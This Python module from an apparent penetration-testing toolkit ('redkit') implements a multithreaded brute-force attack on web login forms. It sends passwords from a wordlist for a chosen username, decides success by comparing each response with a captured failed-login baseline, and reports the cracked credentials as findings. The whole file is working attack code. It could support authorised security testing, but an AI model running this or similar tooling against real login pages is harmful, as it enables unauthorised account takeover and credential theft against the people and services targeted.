"""
modules/auth/login_bruteforce.py — Credential brute-force against a login form.

POSTs each password from a wordlist (paired with the configured username)
to the target login URL and determines success by comparing against a
known-failed baseline response captured before the attack:

- any 3xx redirect after POST is treated as success (classic post-login
  redirect flow),
- a 2xx response whose body lacks the failure string AND differs from the
  baseline failed-login body is treated as success.

This avoids false positives on servers that omit the failure string or
return redirect/error pages. Stops on first success. Includes per-thread
rate-limiting to help avoid account lockouts. Passwords are never written
to the log file in plaintext (they are recorded in findings/reports only).
"""

import logging
import time
import uuid
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from pathlib import Path
from threading import Event

from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.core.http_client import HttpClient
from redkit.core.resources import default_wordlist
from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

_DEFAULT_WORDLIST = default_wordlist("passwords.txt")

_RATE_LIMIT_DELAY: float = 0.5  # seconds between requests per thread

_REDIRECT_STATUSES = (301, 302, 303, 307, 308)


def _mask_secret(secret: str) -> str:
    """Mask a secret value for logging (keeps at most the first 2 characters)."""
    if len(secret) <= 2:
        return "***"
    return secret[:2] + "***"


class LoginBruteforce(BaseModule):
    """Brute-force a web login form by POSTing credentials from a wordlist.

    Before the attack, one deliberately-wrong login attempt is captured as
    the failed-login baseline. Success detection compares each response to
    that baseline (and to the configured failure string) rather than relying
    on the failure string alone. Stops immediately on first successful
    authentication. Reports the discovered credentials as a CRITICAL finding.
    """

    name = "Login Brute-Forcer"
    description = "Brute-forces a login form by POSTing passwords from a wordlist."
    author = "K4os"
    category = "auth"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Full URL of the login form POST endpoint.",
        },
        "username_field": {
            "value": None,
            "required": True,
            "description": "Name attribute of the username HTML field.",
        },
        "password_field": {
            "value": None,
            "required": True,
            "description": "Name attribute of the password HTML field.",
        },
        "username": {
            "value": None,
            "required": True,
            "description": "Username to use for all attempts.",
        },
        "wordlist": {
            "value": str(_DEFAULT_WORDLIST),
            "required": False,
            "type": str,
            "description": "Path to the password wordlist file.",
        },
        "failure_string": {
            "value": None,
            "required": True,
            "description": "String present in the response body on failed login (e.g. 'Invalid password').",
        },
        "threads": {
            "value": 5,
            "required": False,
            "type": int,
            "description": "Number of concurrent threads (default: 5).",
        },
        "timeout": {
            "value": 5,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 5).",
        },
    }

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _load_wordlist(path: str) -> list[str]:
        """Load passwords from the wordlist file, skipping blank and comment lines.

        Args:
            path: Path to the password wordlist.

        Returns:
            List of password strings (comment lines starting with '#' excluded).
        """
        wl_path = Path(path)
        if not wl_path.is_file():
            logger.warning("Password wordlist not found: %s", path)
            return []
        with open(wl_path, encoding="utf-8", errors="ignore") as fh:
            return [line.strip() for line in fh if line.strip() and not line.startswith("#")]

    def _try_password(
        self,
        http: HttpClient,
        target: str,
        username_field: str,
        password_field: str,
        username: str,
        password: str,
        failure_string: str,
        stop_event: Event,
        baseline_body: str | None,
    ) -> str | None:
        """Attempt a single login with the given password.

        Args:
            http: HTTP client.
            target: Login form POST URL.
            username_field: Name of the username field.
            password_field: Name of the password field.
            username: Username to use.
            password: Password candidate.
            failure_string: String indicating login failure.
            stop_event: Threading event set when a success is found.
            baseline_body: Body of a known-failed login attempt, or None if
                the baseline could not be captured.

        Returns:
            The successful password string if login succeeded, else None.
        """
        if stop_event.is_set():
            return None

        time.sleep(_RATE_LIMIT_DELAY)

        data = {username_field: username, password_field: password}
        try:
            # Redirects are not auto-followed so a post-login redirect can be
            # recognised as a success signal.
            resp = http.post(target, data=data, allow_redirects=False)
            # A redirect after POST is the classic successful-login flow.
            if resp.status_code in _REDIRECT_STATUSES:
                return password
            # Anything other than a 2xx (401, 403, 429 rate-limit, 5xx, …) is
            # never a successful login — avoids false positives on rate-limit
            # or error pages that happen to omit the failure string.
            if not (200 <= resp.status_code < 300):
                return None
            if baseline_body is not None:
                # Success requires the failure string to be absent AND the
                # body to differ from the known-failed baseline response.
                if failure_string not in resp.text and resp.text != baseline_body:
                    return password
            else:
                # Baseline unavailable — fall back to failure-string-only
                # detection (less reliable).
                if failure_string not in resp.text:
                    return password
        except Exception as exc:  # noqa: BLE001 — single-attempt failures are logged and skipped
            logger.debug("Request error with password '%s': %s", _mask_secret(password), exc)

        return None

    # ------------------------------------------------------------------
    # run()
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Execute the brute-force attack, stopping on first success."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        username_field = self.get_option("username_field")
        password_field = self.get_option("password_field")
        username = self.get_option("username")
        wordlist_path = self.get_option("wordlist")
        failure_string = self.get_option("failure_string")
        threads = int(self.get_option("threads") or 5)

        http = self.http_client(target)

        passwords = self._load_wordlist(wordlist_path)
        if not passwords:
            logger.error("Empty password list — aborting.")
            return

        stop_event = Event()

        # ------------------------------------------------------------------
        # Baseline calibration — one deliberately-wrong login attempt whose
        # response becomes the reference "known failure" signature.
        # ------------------------------------------------------------------
        baseline_body: str | None = None
        try:
            baseline_resp = http.post(
                target,
                data={
                    username_field: username,
                    password_field: f"redkit-baseline-{uuid.uuid4().hex}",
                },
                allow_redirects=False,
            )
            # A 401 is a perfectly good failed-login baseline (HTTP Basic-
            # style APIs answer 401 to every bad attempt).
            if baseline_resp.status_code in (401,) or (
                baseline_resp.status_code not in _REDIRECT_STATUSES and 200 <= baseline_resp.status_code < 300
            ):
                baseline_body = baseline_resp.text
                logger.info("Captured failed-login baseline (%d bytes).", len(baseline_body))
            else:
                logger.warning(
                    "Baseline login probe returned HTTP %d — unexpected for a failed "
                    "login; falling back to failure-string-only detection.",
                    baseline_resp.status_code,
                )
        except Exception as exc:  # noqa: BLE001
            logger.warning(
                "Could not capture failed-login baseline — falling back to failure-string-only detection: %s",
                exc,
            )

        logger.info(
            "Login brute-force: target=%s, user=%s, passwords=%d, threads=%d",
            target,
            username,
            len(passwords),
            threads,
        )

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Brute-forcing {target} as '{username}'", total=len(passwords))
            self._progress = progress

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures: dict[Future, str] = {
                    executor.submit(
                        self._try_password,
                        http,
                        target,
                        username_field,
                        password_field,
                        username,
                        pw,
                        failure_string,
                        stop_event,
                        baseline_body,
                    ): pw
                    for pw in passwords
                }

                for future in as_completed(futures):
                    if stop_event.is_set():
                        future.cancel()
                        continue
                    pw = futures[future]
                    progress.advance(task)
                    try:
                        result = future.result()
                        if result:
                            stop_event.set()
                            # Never log the plaintext password — it is recorded
                            # in the findings (and therefore the reports) only.
                            logger.warning(
                                "Login success for user '%s' — password withheld "
                                "from logs (see findings/report).",
                                username,
                            )
                            self.add_finding(
                                finding_type="Authentication",
                                severity="CRITICAL",
                                title=f"Valid credentials found: {username}:{result}",
                                detail=(
                                    f"The login form at {target} accepted the credentials "
                                    f"'{username}:{result}'. The response differed from the "
                                    f"captured failed-login baseline and the failure string "
                                    f"'{failure_string}' was absent, indicating successful "
                                    f"authentication."
                                ),
                                evidence=(
                                    f"POST {target}\n{username_field}={username}&{password_field}={result}"
                                ),
                                # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
                                cvss=9.8,
                            )
                    except Exception as exc:  # noqa: BLE001
                        logger.debug("Future error for password '%s': %s", _mask_secret(pw), exc)

        total = len(self.get_findings())
        logger.info("Login brute-force complete: %d valid credential(s) found.", total)
